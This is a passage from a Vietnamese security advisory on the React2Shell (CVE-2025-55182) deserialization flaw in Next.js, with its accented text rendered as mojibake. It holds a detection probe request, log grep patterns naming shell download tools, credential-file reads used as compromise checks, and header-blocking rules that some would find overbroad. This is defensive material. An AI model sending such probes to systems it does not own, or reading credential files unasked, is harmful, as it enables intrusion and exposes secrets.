# T√†i Li·ªáu B·∫£o M·∫≠t: CVE-2025-55182 (React2Shell) v√† Hardening NextJS

## üìã M·ª•c L·ª•c
1. [T·ªïng Quan L·ªó H·ªïng](#t·ªïng-quan-l·ªó-h·ªïng)
2. [Ph√¢n T√≠ch K·ªπ Thu·∫≠t](#ph√¢n-t√≠ch-k·ªπ-thu·∫≠t)
3. [Phi√™n B·∫£n B·ªã ·∫¢nh H∆∞·ªüng](#phi√™n-b·∫£n-b·ªã-·∫£nh-h∆∞·ªüng)
4. [Ki·ªÉm Tra H·ªá Th·ªëng](#ki·ªÉm-tra-h·ªá-th·ªëng)
5. [Kh·∫Øc Ph·ª•c Kh·∫©n C·∫•p](#kh·∫Øc-ph·ª•c-kh·∫©n-c·∫•p)
6. [Ki·∫øn Tr√∫c B·∫£o M·∫≠t](#ki·∫øn-tr√∫c-b·∫£o-m·∫≠t)
7. [Monitoring v√† Detection](#monitoring-v√†-detection)
8. [Indicators of Compromise](#indicators-of-compromise)
9. [Best Practices](#best-practices)
10. [T√†i Nguy√™n Tham Kh·∫£o](#t√†i-nguy√™n-tham-kh·∫£o)

---

## ‚ö†Ô∏è C·∫¢NH B√ÅO KH·∫®N C·∫§P

**CVE-2025-55182 (React2Shell)** l√† l·ªó h·ªïng **CRITICAL SEVERITY** (CVSS 10.0/10.0) cho ph√©p:
- ‚úÖ Remote Code Execution (RCE) kh√¥ng c·∫ßn x√°c th·ª±c
- ‚úÖ Chi·∫øm quy·ªÅn root/administrator c·ªßa VPS
- ‚úÖ C√†i ƒë·∫∑t crypto miner, backdoor, ransomware
- ‚úÖ ƒê√°nh c·∫Øp credentials, secrets, database access
- ‚úÖ Ph√° ho·∫°i h·ªá th·ªëng (GRUB bootloader, file system)

**ƒê√É B·ªä KHAI TH√ÅC TRONG TH·ª∞C T·∫æ** b·ªüi c√°c threat actors t·ª´ Trung Qu·ªëc v√† cybercriminals trong v√≤ng v√†i gi·ªù sau khi c√¥ng b·ªë (3/12/2025).

---

## 1. T·ªïng Quan L·ªó H·ªïng

### 1.1. Th√¥ng Tin C∆° B·∫£n

| Thu·ªôc t√≠nh | Gi√° tr·ªã |
|-----------|---------|
| **CVE ID** | CVE-2025-55182 (React), CVE-2025-66478 (Next.js - ƒë√£ b·ªã reject v√¨ duplicate) |
| **T√™n g·ªçi** | React2Shell |
| **CVSS Score** | 10.0 (Maximum Severity) |
| **Attack Vector** | Network (Remote) |
| **Authentication** | None Required (Unauthenticated) |
| **User Interaction** | None Required |
| **Impact** | Complete System Compromise |
| **Ng√†y c√¥ng b·ªë** | 3 December 2025 |
| **Ng∆∞·ªùi ph√°t hi·ªán** | Lachlan Davidson |

### 1.2. M√¥ T·∫£ L·ªó H·ªïng

CVE-2025-55182 l√† l·ªó h·ªïng **unsafe deserialization** trong React Server Components (RSC) Flight protocol. L·ªó h·ªïng cho ph√©p attacker:

1. G·ª≠i m·ªôt HTTP request ƒë∆∞·ª£c craft ƒë·∫∑c bi·ªát ƒë·∫øn b·∫•t k·ª≥ Server Function endpoint n√†o
2. Payload ƒë·ªôc h·∫°i ƒë∆∞·ª£c deserialize kh√¥ng an to√†n b·ªüi react-server
3. D·ªØ li·ªáu do attacker ki·ªÉm so√°t ·∫£nh h∆∞·ªüng ƒë·∫øn server-side execution logic
4. K·∫øt qu·∫£: **Remote Code Execution** v·ªõi quy·ªÅn c·ªßa Node.js process

**ƒê·∫∑c ƒëi·ªÉm nguy hi·ªÉm:**
- ‚úÖ Kh√¥ng c·∫ßn authentication
- ‚úÖ Default configuration ƒë√£ vulnerable
- ‚úÖ App t·∫°o b·∫±ng `create-next-app` c√≥ th·ªÉ b·ªã exploit ngay
- ‚úÖ K·ªÉ c·∫£ khi app kh√¥ng c√≥ Server Function endpoints, v·∫´n vulnerable n·∫øu support RSC
- ‚úÖ Exploit c√≥ ƒë·ªô tin c·∫≠y g·∫ßn 100%

### 1.3. T√°c ƒê·ªông Th·ª±c T·∫ø

**ƒê√£ quan s√°t ƒë∆∞·ª£c trong th·ª±c t·∫ø:**
- üî¥ C√†i ƒë·∫∑t crypto miners (XMRig, other mining tools)
- üî¥ Tri·ªÉn khai backdoors (Sliver, Cobalt Strike)
- üî¥ ƒê√°nh c·∫Øp cloud credentials (AWS IAM, GCP, Azure)
- üî¥ Harvesting secrets (.env, .ssh, .aws, .kube, wallets)
- üî¥ Ph√° ho·∫°i GRUB bootloader
- üî¥ Lateral movement trong cloud environments
- üî¥ Ransomware deployment

**Th·ªëng k√™:**
- 39% cloud environments c√≥ instances vulnerable
- 12+ million websites c√≥ th·ªÉ b·ªã ·∫£nh h∆∞·ªüng
- Exploitation b·∫Øt ƒë·∫ßu trong v√≤ng v√†i gi·ªù sau khi c√¥ng b·ªë
- State-sponsored threat actors (China) v√† cybercriminals ƒë√£ weaponize

---

## 2. Ph√¢n T√≠ch K·ªπ Thu·∫≠t

### 2.1. Root Cause

L·ªó h·ªïng n·∫±m trong c√°ch react-server package x·ª≠ l√Ω RSC payloads qua Flight protocol:

```javascript
// Vulnerable code flow trong react-server-dom-webpack
function requireModule(id) {
  // Attacker c√≥ th·ªÉ control 'id' th√¥ng qua crafted payload
  // D·∫´n ƒë·∫øn vi·ªác call vm.runInThisContext() v·ªõi attacker-controlled code
}
```

### 2.2. Attack Vector

**HTTP Request Pattern:**
```http
POST / HTTP/1.1
Host: vulnerable-nextjs-app.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Next-Action: x
X-Nextjs-Request-Id: random-id
Next-Router-State-Tree: ["",{"children":["__PAGE__",{},null,null]},null,null,true]

------WebKitFormBoundary
Content-Disposition: form-data; name="0"

["$MALICIOUS_PAYLOAD"]
------WebKitFormBoundary--
```

**Malicious Payload Structure:**
- Attacker craft RSC payload v·ªõi self-referencing "gadget chains"
- Exploit prototype pollution trong deserialization
- Trigger `vm.runInThisContext()` v·ªõi arbitrary code
- Bypass validation checks

### 2.3. Affected Components

```
react-server-dom-webpack
react-server-dom-parcel  
react-server-dom-turbopack
‚îî‚îÄ‚îÄ Vulnerable versions: 19.0.0, 19.1.0, 19.1.1, 19.2.0

Next.js (s·ª≠ d·ª•ng App Router)
‚îî‚îÄ‚îÄ Vulnerable: >=14.3.0-canary.77, all 15.x, all 16.x (unpatched)

Other frameworks:
‚îú‚îÄ‚îÄ React Router RSC preview
‚îú‚îÄ‚îÄ RedwoodJS/SDK
‚îú‚îÄ‚îÄ Waku
‚îú‚îÄ‚îÄ Vite RSC plugin
‚îî‚îÄ‚îÄ Parcel RSC plugin
```

---

## 3. Phi√™n B·∫£n B·ªã ·∫¢nh H∆∞·ªüng

### 3.1. React Server Components

**Vulnerable Versions:**
- `react-server-dom-webpack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `react-server-dom-parcel`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `react-server-dom-turbopack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0

**Patched Versions:**
- ‚úÖ React 19.0.1
- ‚úÖ React 19.1.2
- ‚úÖ React 19.2.1

### 3.2. Next.js

**Vulnerable Versions:**
- ‚ùå Next.js 14.3.0-canary.77 v√† t·∫•t c·∫£ canary releases sau ƒë√≥
- ‚ùå Next.js 15.0.0 - 15.0.4
- ‚ùå Next.js 15.1.0 - 15.1.8
- ‚ùå Next.js 15.2.0 - 15.2.5
- ‚ùå Next.js 15.3.0 - 15.3.5
- ‚ùå Next.js 15.4.0 - 15.4.7
- ‚ùå Next.js 15.5.0 - 15.5.6
- ‚ùå Next.js 16.0.0 - 16.0.6

**Patched Versions:**
- ‚úÖ Next.js 15.0.5
- ‚úÖ Next.js 15.1.9
- ‚úÖ Next.js 15.2.6
- ‚úÖ Next.js 15.3.6
- ‚úÖ Next.js 15.4.8
- ‚úÖ Next.js 15.5.7
- ‚úÖ Next.js 16.0.7

**QUAN TR·ªåNG:**
- Next.js 13.x: **KH√îNG B·ªä ·∫¢NH H∆Ø·ªûNG**
- Next.js 14.x stable (kh√¥ng ph·∫£i canary): **KH√îNG B·ªä ·∫¢NH H∆Ø·ªûNG**
- Pages Router: **KH√îNG B·ªä ·∫¢NH H∆Ø·ªûNG**
- **CH·ªà App Router** b·ªã ·∫£nh h∆∞·ªüng

### 3.3. Tr∆∞·ªùng H·ª£p C·ªßa B·∫°n

Theo th√¥ng tin b·∫°n cung c·∫•p:
- ‚ùå **Next.js 14**: N·∫øu ƒëang d√πng canary >= 14.3.0-canary.77 ‚Üí **VULNERABLE**
- ‚ùå **Next.js 16**: T·∫•t c·∫£ version 16.x tr∆∞·ªõc 16.0.7 ‚Üí **VULNERABLE**

**H√ÄNH ƒê·ªòNG C·∫¶N THI·∫æT:** Update ngay l·∫≠p t·ª©c!

---

## 4. Ki·ªÉm Tra H·ªá Th·ªëng

### 4.1. Ki·ªÉm Tra Phi√™n B·∫£n

```bash
# Check Next.js version
cd /path/to/your/nextjs-app
npm list next

# Check React version
npm list react react-dom

# Check cho React Server packages
npm list | grep react-server-dom
```

### 4.2. Ki·ªÉm Tra C·∫•u H√¨nh

```javascript
// Check file next.config.js
// N·∫øu s·ª≠ d·ª•ng App Router (c√≥ th∆∞ m·ª•c app/) ‚Üí C√≥ th·ªÉ vulnerable
// N·∫øu ch·ªâ d√πng Pages Router (ch·ªâ c√≥ th∆∞ m·ª•c pages/) ‚Üí Kh√¥ng vulnerable

// Check structure:
your-nextjs-project/
‚îú‚îÄ‚îÄ app/           ‚Üê App Router (VULNERABLE n·∫øu version c≈©)
‚îú‚îÄ‚îÄ pages/         ‚Üê Pages Router (SAFE)
‚îî‚îÄ‚îÄ package.json
```

### 4.3. Tool Ki·ªÉm Tra T·ª± ƒê·ªông

**Option 1: S·ª≠ d·ª•ng npx tool:**
```bash
# Next.js official scanner
npx fix-react2shell-next

# Tool n√†y s·∫Ω:
# - Check version hi·ªán t·∫°i
# - ƒê·ªÅ xu·∫•t patched version
# - T·ª± ƒë·ªông update n·∫øu ƒë·ªìng √Ω
```

**Option 2: Manual detection request (C·∫®UN TH·∫¨N - ch·ªâ test tr√™n local):**
```bash
# Test detection (KH√îNG g√¢y h·∫°i, ch·ªâ check)
curl -X POST http://localhost:3000 \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: test123" \
  -H 'Next-Router-State-Tree: ["",{"children":["__PAGE__",{},null,null]},null,null,true]' \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  -d '------WebKitFormBoundary
Content-Disposition: form-data; name="0"

["$1:a:a"]
------WebKitFormBoundary
Content-Disposition: form-data; name="1"

{}
------WebKitFormBoundary--'

# N·∫øu vulnerable: HTTP 500 error
# N·∫øu patched: Request b·ªã ignore/reject properly
```

### 4.4. Ki·ªÉm Tra Log Files

```bash
# Check access logs cho suspicious patterns
grep -i "next-action\|rsc-action" /var/log/nginx/access.log
grep -i "multipart/form-data" /var/log/nginx/access.log | grep "POST"

# Check cho exploitation attempts
grep -E "wget|curl|bash|sh|cmd|powershell" /var/log/nginx/access.log

# Check system logs
journalctl -u your-nextjs-service --since "2025-12-03" | grep -i error
```

### 4.5. Ki·ªÉm Tra D·∫•u Hi·ªáu ƒê√£ B·ªã Hack

```bash
# 1. Check processes ƒëang ch·∫°y
ps aux | grep -E "xmrig|miner|crypto|coin"
ps aux | grep -E "wget|curl" | grep -v grep

# 2. Check network connections
netstat -antp | grep ESTABLISHED
ss -tunap | grep :443

# 3. Check cron jobs
crontab -l
cat /etc/cron*/*

# 4. Check startup services
systemctl list-units --type=service --state=running

# 5. Check recent file modifications
find /root -type f -mtime -7 -ls
find /home -type f -mtime -7 -ls
find /tmp -type f -mtime -1 -ls

# 6. Check GRUB bootloader
ls -la /boot/grub/grub.cfg
grub-install --version

# 7. Check cho backdoors
find / -name "*.sh" -mtime -7 2>/dev/null
find / -name "sex.sh" 2>/dev/null  # Known malware filename

# 8. Check cloud credentials
find ~ -name ".aws" -o -name ".kube" -o -name ".config/gcloud"
cat ~/.aws/credentials 2>/dev/null
cat ~/.kube/config 2>/dev/null
```

---

## 5. Kh·∫Øc Ph·ª•c Kh·∫©n C·∫•p

### 5.1. B∆∞·ªõc 1: Immediate Patching (∆ØU TI√äN CAO NH·∫§T)

```bash
# CRITICAL: Update ngay l·∫≠p t·ª©c

# Cho Next.js 15.x:
npm install next@15.5.7
# Ho·∫∑c v·ªõi specific version theo major version c·ªßa b·∫°n

# Cho Next.js 16.x:
npm install next@16.0.7

# Cho Next.js 14.x canary (downgrade v·ªÅ stable):
npm install next@14.2.18  # Latest stable 14.x

# Update React dependencies (n·∫øu c·∫ßn):
npm install react@19.2.1 react-dom@19.2.1

# Rebuild application:
npm run build

# Restart service:
pm2 restart all
# Ho·∫∑c
systemctl restart your-nextjs-service
```

**Tool t·ª± ƒë·ªông:**
```bash
npx fix-react2shell-next
```

### 5.2. B∆∞·ªõc 2: Deploy WAF Rules (Ngay l·∫≠p t·ª©c)

N·∫øu b·∫°n ƒëang d√πng VPS v√† ch∆∞a c√≥ WAF, c√†i ƒë·∫∑t ngay:

**Option A: ModSecurity (Free, Open Source)**

```bash
# Install ModSecurity v·ªõi Nginx
sudo apt update
sudo apt install -y nginx-extras libnginx-mod-security2

# Enable ModSecurity
sudo vim /etc/nginx/modsec/modsecurity.conf
# Set: SecRuleEngine On

# Add custom rule cho CVE-2025-55182:
sudo vim /etc/nginx/modsec/custom-rules.conf
```

```nginx
# CVE-2025-55182 Protection Rules
SecRule REQUEST_HEADERS:Next-Action "@rx ." \
    "id:2025001,\
    phase:1,\
    block,\
    log,\
    msg:'CVE-2025-55182 React2Shell Exploitation Attempt',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    severity:'CRITICAL',\
    chain"
    SecRule REQUEST_METHOD "@streq POST" \
        "chain"
        SecRule REQUEST_HEADERS:Content-Type "@contains multipart/form-data"

SecRule REQUEST_HEADERS:X-Nextjs-Request-Id "@rx ." \
    "id:2025002,\
    phase:1,\
    block,\
    log,\
    msg:'CVE-2025-55182 Suspicious Next.js Request Header',\
    severity:'CRITICAL',\
    chain"
    SecRule REQUEST_HEADERS:Next-Router-State-Tree "@rx ."

# Block malformed RSC payloads
SecRule REQUEST_BODY "@rx \[\"\$[^\]]+\"\]" \
    "id:2025003,\
    phase:2,\
    block,\
    log,\
    msg:'CVE-2025-55182 Malicious RSC Payload Pattern',\
    severity:'CRITICAL'"
```

```bash
# Reload Nginx
sudo nginx -t
sudo systemctl reload nginx
```

**Option B: Cloudflare (N·∫øu d√πng)**

Cloudflare ƒë√£ t·ª± ƒë·ªông deploy WAF rules cho t·∫•t c·∫£ customers. ƒê·∫£m b·∫£o:
```
1. Traffic ƒë∆∞·ª£c proxy qua Cloudflare (orange cloud)
2. WAF/Firewall ƒë∆∞·ª£c enable
3. Check Security Events trong dashboard
```

**Option C: Nginx Rate Limiting (Temporary mitigation)**

```nginx
# Th√™m v√†o nginx.conf
http {
    # Rate limit zone
    limit_req_zone $binary_remote_addr zone=nextjs_limit:10m rate=5r/s;
    limit_req_status 429;
    
    # Connection limit
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    
    server {
        listen 80;
        server_name your-domain.com;
        
        # Apply rate limiting to RSC endpoints
        location / {
            limit_req zone=nextjs_limit burst=10 nodelay;
            limit_conn conn_limit 10;
            
            # Block suspicious headers
            if ($http_next_action) {
                return 403;
            }
            
            if ($http_x_nextjs_request_id) {
                if ($request_method = POST) {
                    return 403;
                }
            }
            
            proxy_pass http://localhost:3000;
        }
    }
}
```

### 5.3. B∆∞·ªõc 3: Network Segmentation (Ngay)

```bash
# S·ª≠ d·ª•ng firewall ƒë·ªÉ restrict access

# UFW (Ubuntu)
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable

# iptables (Advanced)
sudo iptables -A INPUT -p tcp --dport 3000 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 3000 -j DROP
sudo iptables-save > /etc/iptables/rules.v4
```

### 5.4. B∆∞·ªõc 4: Isolate NextJS Process

```bash
# Ch·∫°y NextJS v·ªõi restricted user
sudo useradd -r -s /bin/false nextjs-user
sudo chown -R nextjs-user:nextjs-user /path/to/nextjs-app

# Update PM2/systemd service
sudo vim /etc/systemd/system/nextjs.service
```

```ini
[Unit]
Description=Next.js Application
After=network.target

[Service]
Type=simple
User=nextjs-user
Group=nextjs-user
WorkingDirectory=/path/to/nextjs-app
ExecStart=/usr/bin/node /path/to/nextjs-app/.next/standalone/server.js
Restart=always
RestartSec=10

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/path/to/nextjs-app
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl restart nextjs
```

### 5.5. B∆∞·ªõc 5: Monitoring Setup (Ngay)

```bash
# C√†i ƒë·∫∑t monitoring tools
npm install --save-dev @datadog/browser-logs
# Ho·∫∑c
npm install winston

# Setup log aggregation
sudo apt install -y rsyslog
```

---

## 6. Ki·∫øn Tr√∫c B·∫£o M·∫≠t

### 6.1. Architecture Overview

**CURRENT (Vulnerable):**
```
Internet ‚Üí NextJS (Frontend + RSC) ‚Üí PostgreSQL
              ‚Üì
          Direct Server Access (DANGEROUS!)
```

**RECOMMENDED (Secure):**
```
Internet ‚Üí WAF/CDN ‚Üí Reverse Proxy (Nginx) ‚Üí NextJS Frontend
                                                   ‚Üì (API Gateway)
                                              Backend API (Node.js)
                                                   ‚Üì
                                              PostgreSQL
```

### 6.2. T√°ch Bi·ªát Frontend v√† Backend

#### 6.2.1. Backend API (Node.js + Express)

```javascript
// backend/server.js
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const jwt = require('jsonwebtoken');
const cors = require('cors');

const app = express();

// Security middleware
app.use(helmet());
app.use(express.json({ limit: '10mb' }));

// CORS configuration - CH·ªà cho ph√©p frontend domain
const corsOptions = {
  origin: process.env.FRONTEND_URL || 'https://yourdomain.com',
  credentials: true,
  optionsSuccessStatus: 200,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
};
app.use(cors(corsOptions));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', limiter);

// JWT verification middleware
const verifyToken = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid token' });
  }
};

// Authentication endpoint
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Validate credentials (implement your logic)
    const user = await validateUser(email, password);
    
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Generate JWT
    const token = jwt.sign(
      { 
        userId: user.id,
        email: user.email,
        role: user.role 
      },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );
    
    // Send token in httpOnly cookie
    res.cookie('auth_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });
    
    res.json({ 
      success: true,
      user: {
        id: user.id,
        email: user.email,
        role: user.role
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Protected API routes
app.get('/api/user/profile', verifyToken, async (req, res) => {
  try {
    // Get user data from database
    const user = await getUserById(req.user.userId);
    res.json({ user });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, '127.0.0.1', () => {
  console.log(`Backend API listening on port ${PORT}`);
});
```

```bash
# backend/.env
NODE_ENV=production
PORT=4000
JWT_SECRET=your-super-secret-key-here-change-this
DATABASE_URL=postgresql://user:pass@localhost:5432/dbname
FRONTEND_URL=https://yourdomain.com
```

#### 6.2.2. NextJS Frontend (CH·ªà l√†m presentation layer)

```typescript
// frontend/app/api/auth/login/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    
    // FORWARD request ƒë·∫øn backend API
    const backendResponse = await fetch(`${process.env.BACKEND_API_URL}/api/auth/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });
    
    const data = await backendResponse.json();
    
    if (!backendResponse.ok) {
      return NextResponse.json(data, { status: backendResponse.status });
    }
    
    // Forward cookie t·ª´ backend
    const response = NextResponse.json(data);
    const authCookie = backendResponse.headers.get('set-cookie');
    
    if (authCookie) {
      response.headers.set('set-cookie', authCookie);
    }
    
    return response;
  } catch (error) {
    console.error('Proxy error:', error);
    return NextResponse.json(
      { error: 'Failed to connect to authentication service' },
      { status: 500 }
    );
  }
}
```

```typescript
// frontend/lib/api.ts
export class ApiClient {
  private baseUrl: string;
  
  constructor() {
    // ALWAYS call backend through API routes, NEVER directly from client
    this.baseUrl = '/api';
  }
  
  async request(endpoint: string, options: RequestInit = {}) {
    const url = `${this.baseUrl}${endpoint}`;
    
    const config: RequestInit = {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...options.headers,
      },
      credentials: 'include', // Include cookies
    };
    
    try {
      const response = await fetch(url, config);
      
      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message || 'API request failed');
      }
      
      return await response.json();
    } catch (error) {
      console.error('API request error:', error);
      throw error;
    }
  }
  
  async get(endpoint: string) {
    return this.request(endpoint, { method: 'GET' });
  }
  
  async post(endpoint: string, data: any) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data),
    });
  }
}

export const api = new ApiClient();
```

```typescript
// frontend/middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // Verify authentication on protected routes
  const protectedPaths = ['/dashboard', '/profile', '/admin'];
  const { pathname } = request.nextUrl;
  
  const isProtectedPath = protectedPaths.some(path => 
    pathname.startsWith(path)
  );
  
  if (isProtectedPath) {
    const token = request.cookies.get('auth_token');
    
    if (!token) {
      return NextResponse.redirect(new URL('/login', request.url));
    }
    
    // Additional token validation n·∫øu c·∫ßn
  }
  
  return NextResponse.next();
}

export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
};
```

```bash
# frontend/.env.local
BACKEND_API_URL=http://localhost:4000
NEXT_PUBLIC_SITE_URL=https://yourdomain.com
```

### 6.3. Nginx Reverse Proxy Configuration

```nginx
# /etc/nginx/sites-available/your-app

# Rate limiting zones
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=general_limit:10m rate=30r/s;
limit_conn_zone $binary_remote_addr zone=conn_limit:10m;

# Upstream definitions
upstream nextjs_frontend {
    server 127.0.0.1:3000;
    keepalive 64;
}

upstream nodejs_backend {
    server 127.0.0.1:4000;
    keepalive 64;
}

server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name yourdomain.com www.yourdomain.com;
    
    # SSL Configuration
    ssl_certificate /path/to/fullchain.pem;
    ssl_certificate_key /path/to/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';" always;
    
    # Connection limits
    limit_conn conn_limit 20;
    
    # Logging
    access_log /var/log/nginx/app_access.log combined;
    error_log /var/log/nginx/app_error.log warn;
    
    # Block CVE-2025-55182 exploitation attempts
    if ($http_next_action != "") {
        return 403;
    }
    
    if ($http_rsc_action_id != "") {
        return 403;
    }
    
    # Backend API routes (protected)
    location /api/ {
        limit_req zone=api_limit burst=20 nodelay;
        
        # CRITICAL: Backend ch·ªâ accessible qua proxy, kh√¥ng direct
        proxy_pass http://nodejs_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
    
    # Frontend (NextJS)
    location / {
        limit_req zone=general_limit burst=50 nodelay;
        
        proxy_pass http://nextjs_frontend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        
        # Block suspicious patterns
        if ($request_method = POST) {
            set $post_block 0;
            
            if ($http_content_type ~* "multipart/form-data") {
                set $post_block 1;
            }
            
            if ($http_x_nextjs_request_id != "") {
                set $post_block "${post_block}1";
            }
            
            # Block if both conditions met
            if ($post_block = "11") {
                return 403;
            }
        }
    }
    
    # Static files
    location /_next/static/ {
        proxy_pass http://nextjs_frontend;
        proxy_cache_valid 200 1d;
        add_header Cache-Control "public, immutable";
    }
    
    # Health checks
    location /health {
        access_log off;
        return 200 "healthy\n";
        add_header Content-Type text/plain;
    }
}
```

### 6.4. Environment Isolation

```yaml
# docker-compose.yml (Recommended)
version: '3.8'

services:
  # Frontend (NextJS)
  frontend:
    build: ./frontend
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - BACKEND_API_URL=http://backend:4000
    networks:
      - frontend-network
    restart: unless-stopped
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    read_only: true
    tmpfs:
      - /tmp
      - /app/.next/cache
    
  # Backend API
  backend:
    build: ./backend
    expose:
      - "4000"
    environment:
      - NODE_ENV=production
      - DATABASE_URL=${DATABASE_URL}
      - JWT_SECRET=${JWT_SECRET}
    networks:
      - frontend-network
      - backend-network
    restart: unless-stopped
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    
  # PostgreSQL (isolated)
  postgres:
    image: postgres:16-alpine
    volumes:
      - postgres-data:/var/lib/postgresql/data
    environment:
      - POSTGRES_DB=${DB_NAME}
      - POSTGRES_USER=${DB_USER}
      - POSTGRES_PASSWORD=${DB_PASSWORD}
    networks:
      - backend-network
    restart: unless-stopped
    
  # Nginx Reverse Proxy
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/ssl:/etc/nginx/ssl:ro
    networks:
      - frontend-network
    depends_on:
      - frontend
      - backend
    restart: unless-stopped

networks:
  frontend-network:
    driver: bridge
  backend-network:
    driver: bridge
    internal: true  # No external access

volumes:
  postgres-data:
```

---

## 7. Monitoring v√† Detection

### 7.1. Log Monitoring Setup

```javascript
// logger.js - Centralized logging
const winston = require('winston');
const { Loggly } = require('winston-loggly-bulk');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  transports: [
    // File logs
    new winston.transports.File({ 
      filename: 'logs/error.log', 
      level: 'error',
      maxsize: 5242880, // 5MB
      maxFiles: 5,
    }),
    new winston.transports.File({ 
      filename: 'logs/combined.log',
      maxsize: 5242880,
      maxFiles: 5,
    }),
    
    // Console
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
  ],
});

// Security event logger
const securityLogger = winston.createLogger({
  level: 'warn',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ 
      filename: 'logs/security.log',
      maxsize: 10485760, // 10MB
      maxFiles: 10,
    }),
  ],
});

module.exports = { logger, securityLogger };
```

```javascript
// middleware/securityLogger.js
const { securityLogger } = require('../logger');

function logSecurityEvent(req, res, next) {
  // Check for CVE-2025-55182 indicators
  const suspiciousHeaders = [
    'next-action',
    'x-nextjs-request-id',
    'next-router-state-tree',
    'rsc-action-id'
  ];
  
  const hasSuspiciousHeader = suspiciousHeaders.some(header => 
    req.headers[header]
  );
  
  if (hasSuspiciousHeader && req.method === 'POST') {
    securityLogger.warn({
      type: 'CVE-2025-55182_ATTEMPT',
      timestamp: new Date().toISOString(),
      ip: req.ip,
      headers: req.headers,
      method: req.method,
      path: req.path,
      userAgent: req.get('user-agent'),
      severity: 'HIGH'
    });
  }
  
